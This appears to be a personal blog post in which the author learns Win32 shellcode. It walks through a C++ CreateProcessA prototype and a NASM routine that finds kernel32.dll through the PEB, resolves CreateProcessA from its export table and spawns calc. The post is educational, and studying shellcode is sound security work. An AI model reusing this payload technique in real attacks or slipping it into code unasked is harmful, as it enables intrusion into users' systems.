---
layout: single
title: Baby's First Win32 Shellcode
date: 2019-10-17
classes: wide
header:
  teaser: /assets/images/avatar.jpg
tags:
  - Shellcode
  - Windows
  - C++ 
  - Assembly
  - CreateProcessA
  - Calc
---


## Win32 Shellcode
Earnestly starting my Windows exploitation journey and figured a good way to get familiar with some aspects of WinAPIs would be to create some pretty basic shellcode. We've spent the last couple of months just learning the basics of C/C++ so that background will help us here. MSDN does a pretty nice job of documenting the APIs and their constinuent parts. 

## Recommended Reading
These blogposts are awesome and both are part of a series. Both of them really spell out every single aspect creating dynamic shellcode that doesn't rely on hardcoded addresses. I won't spend much time in this blog post rehashing all of their wisdom, I beg you to read them, understand them, and go through them step by step in a debugger until you understand if you're at all interested in low-level programming on Windows/Shellcode, etc. 

+ [Introduction to Windows Shellcode Development -- Part 3](https://securitycafe.ro/2016/02/15/introduction-to-windows-shellcode-development-part-3/) by [@NytroRST](https://twitter.com/NytroRST)

+ [Windows Shellcoding x86 -- Hunting Kernel32.dll -- Part 1](https://0xdarkvortex.dev/index.php/2019/03/18/windows-shellcoding-x86-hunting-kernel32-dll-part-1/) by [@NinjaParanoid](https://twitter.com/NinjaParanoid)

We lean more on the former blog post, but in a subsequent blogpost we will be implementing the techiques discussed more in the latter. The techniques discussed in both blog posts are pretty similar with regards to finding the base address in memory of `kernel32.dll`.

Huge thanks to @NytroRST and @NinjaParanoid for producing such high-quality content for free. It means a lot to us just starting out. 

## Working PoC
Following along with the aforementioned blogposts and trying to cobble together my own shellcode that would:
+ Find the base address in memory of `kernel32.dll`
+ Find the address API function `CreateProcessA` within `kernel32.dll`
+ Use `CreateProcessA` to spawn a calculator. 

Seems simple enough? It was actually pretty hard for me to follow along! 

### C++ Prototype 
Before we get started writing Assembly, I wanted to create a `C++` version of the `CreateProcessA` API call spawning calc so that I had a rough idea of what was required in Assembly. Consulting the [MSDN documenation](https://docs.microsoft.com/en-us/windows/win32/procthread/creating-processes), I came up with a bare-bones implementation of: 
```c++
#include <windows.h>

int main (void) 
{
    STARTUPINFO si = { sizeof(STARTUPINFO) };
    PROCESS_INFORMATION pi;
    CreateProcessA(NULL, "calc", NULL, NULL, FALSE, NULL, NULL, NULL, &si, &pi);
}
```

`STARTUPINFO` is a struct with a bunch of members; however, I only really needed to initialize the first member `cb` which is an unsigned int for the size of the structure. The `PROCESS_INFORMATION` structure really didn't even need any members initialized. Most of the parameters in the `CreateProcessA` API ended up being `NULL` except for the `lpCommandLine` parameter which is of the `LPSTR` data type and is `"calc"` in this case.

### CreateProcessA Calc Shellcode v1.0
Concerned only with making shellcode that would spawn a calculator, leaving the stress of creating Null-free/optimized code aside for the time being, I came up with the following after heavily borrowing concepts from both aforementioned blog posts. Again, I beg you to go read the blog posts I mentioned earlier which explain every single step in critical detail. I copied a lot of code from both blogs, and for the final `CreateProcessA` call, I copied a lot of code from [here](https://packetstormsecurity.com/files/102847/All-Windows-Null-Free-CreateProcessA-Calc-Shellcode.html). 
```nasm
global_start


section .text
_start: 

    
    ; find base address of kernel32.dll
    xor ecx, ecx
    mov eax, [fs:ecx + 0x30]    ; offset to the PEB struct
    mov eax, [eax + 0xc]        ; offset to LDR within PEB
    mov eax, [eax + 0x14]       ; offset to InMemoryOrderModuleList
    mov eax, [eax]              ; moving to 2nd loaded module
    mov eax, [eax]              ; moving to 3rd loaded module
    mov eax, [eax + 0x10]       ; moving to base address of 3rd loaded module (kernel32.dll)

    ; parse kernel32.dll for the beginning of the "AddressOfNames" array of pointers
    mov edx, [eax + 0x3c]       ; offset to e_lfanew
    add edx, eax                ; PE Header offset + base address
    mov edx, [edx + 0x78]       ; offset to export table
    add edx, eax                ; export table offset + base address
    mov esi, [edx + 0x20]       ; offset to names table
    add esi, eax                ; offset to names table + base address
    xor ecx, ecx                ; zero out ECX so we can use it as a counter

    ; start our loop to find a string match with our desired function, which is 'CreateProcessA'. we will end up with the ordinal of the function
    Get_Function:

    inc ecx                             ; increase ECX to keep track of our iterations
    mov ebx, [esi]                      
    add esi, 0x4                        ; get name offset
    add ebx, eax                        ; get function name 
    cmp dword [ebx], 0x61657243         ; Crea
    jnz Get_Function
    cmp dword [ebx + 0x4], 0x72506574   ; tePr  
    jnz Get_Function
    cmp dword [ebx + 0x8], 0x7365636f   ; oces
    jnz Get_Function
    cmp word [ebx + 0xa], 0x41737365	  ; essA
    jnz Get_Function                    ; if we get past here, we know our program has found 'CreateProcessA'

    ; now that we have the ordinal, we need to find the real address of the CreateProcessA function
    mov esi, [edx + 0x24]               ; get the offset to the "AddressOfNameOrdinals" offset from IMAGE_EXPORT_DIRECTORY
    add esi, eax                        ; offset + base address
    mov cx, [esi + ecx * 2]             ; We want index number of an array essentially. Array is full of two-byte numbers. (ecx *2)
    dec ecx                             ; accounting for index [0] of the array
    mov esi, [edx + 0x1c]               ; "AddressOfFunctions" offset
    add esi, eax                        ; offset + base address
    mov edx, [esi + ecx * 4]            ; 4 byte indexes in this new array (ecx * 4)
    add edx, eax                        ; offset + base address. EDX now holds memory addr of CreateProcessA

    ; we now have the address of CreateProcessA inside of EDX. we can call calc.exe by just placing 'calc' on the stack, and setting a pointer to it to satisfy the struct arguments 
    ; for 'lpProcessInformation' and 'lpStartupInfo'

    xor ecx, ecx                ; zero out counter register
    mov cl, 0xff                ; we'll loop 255 times (0xff)
    xor edi, edi                ; edi now 0x00000000

    zero_loop:
    push edi                    ; place 0x00000000 on stack 255 times as a way to 'zero memory' 
    loop zero_loop

    
    push 0x636c6163             ; 'calc'
    mov ecx, esp                ; stack pointer to 'calc'

    push ecx                    ; processinfo pointing to 'calc' as a struct argument
    push ecx                    ; startupinfo pointing to 'calc' as a struct argument
    xor eax, eax                ; zero out
    push eax                    ; NULLS
    push eax
    push eax
    push eax
    push eax
    push eax
    push ecx                    ; 'calc'
    push eax
    call edx                    ; call CreateProcessA and spawn calc
```

## Optimizing a Bit
